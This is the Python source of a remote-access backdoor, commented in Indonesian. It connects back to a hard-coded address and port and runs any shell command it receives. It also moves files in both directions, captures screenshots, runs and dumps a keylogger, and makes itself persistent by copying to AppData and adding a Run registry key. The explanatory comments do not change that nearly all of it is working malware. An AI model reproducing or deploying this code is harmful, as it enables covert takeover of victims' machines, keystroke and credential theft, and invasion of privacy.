# Program ini adalah sebuah backdoor yang ditulis menggunakan Python.
import socket
import json
import subprocess
import time
import os
import pyautogui
import keylogger
import threading
import shutil
import sys
# 1. **Import Library**: Program mengimpor beberapa modul Python yang diperlukan
#                       seperti `socket`, `json`, `subprocess`, `time`, `os`, `pyautogui`, `keylogger`, `threading`, dan `shutil`.

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
    # 2. **Fungsi `reliable_send`**: Fungsi ini mengirim data ke socket dalam format JSON.
    #                                Data dienkripsi menggunakan JSON sebelum dikirim.


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        # 3. **Fungsi `reliable_recv`**: Fungsi ini menerima data dari socket dan mengembalikan data yang diterima dalam bentuk JSON.

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()
    # 4. **Fungsi `download_file`**: Fungsi ini menerima file dari socket dan menyimpannya dalam sistem.

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
    # 5. **Fungsi `upload_file`**: Fungsi ini membaca file dari sistem dan mengirimnya ke socket.

def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('screen.png')
    # 6. **Fungsi `screenshot`**: Fungsi ini mengambil tangkapan layar (screenshot) dari layar komputer dan menyimpannya dalam sistem.

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] DIbuat Persistensi Dengan Kunci Reg: ' + reg_name)
        else:
            reliable_send('[+] Persistensi Sudah Ada')
    except:
        reliable_send('[+] Kesalah Membuat Persistensi Dengan Mesin Target')
        # 7. **Fungsi `persist`**: Fungsi ini membuat backdoor persisten pada sistem target dengan menyalin file backdoor ke lokasi yang spesifik dan menambahkan entri registri untuk menjalankannya saat sistem di-boot.

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.1.4', 5555))
            shell()
            s.close()
            break
        except:
            connection()
            # 8. **Fungsi `connection`**: Fungsi ini berulang kali mencoba untuk terhubung ke host remote dengan menggunakan socket.
            #                             Jika koneksi berhasil, maka fungsi `shell` akan dipanggil.


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Dimulai!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger Berhenti!')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)
            # 9. **Fungsi `shell`**: Fungsi ini menangani eksekusi perintah yang diterima dari host remote.
            #                       Perintah-perintah tersebut dieksekusi pada terminal atau command prompt pada sistem target. 
            #                       Beberapa perintah yang dapat dilakukan antara lain: navigasi direktori (`cd`), mengunggah dan mengunduh file (`upload` dan `download`), mengambil tangkapan layar (`screenshot`), memulai, membaca, dan menghentikan keylogger (`keylog_start`, `keylog_dump`, dan `keylog_stop`), membuat backdoor persisten (`persistence`), dan menjalankan perintah shell (`sendall`).
            #                       Setiap hasil eksekusi perintah akan dikirim kembali ke host remote.


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
# 10. **Inisialisasi Socket dan Koneksi**: Program membuat sebuah socket dan mencoba untuk terhubung ke host remote melalui alamat IP dan port tertentu.
#                                          Jika koneksi berhasil, program akan memanggil fungsi `shell` untuk menunggu perintah dari host remote.

# program ini bertindak sebagai backdoor yang memungkinkan penyerang untuk mengambil alih dan mengendalikan sistem target dari jarak jauh.
# ============================================================================================================================================
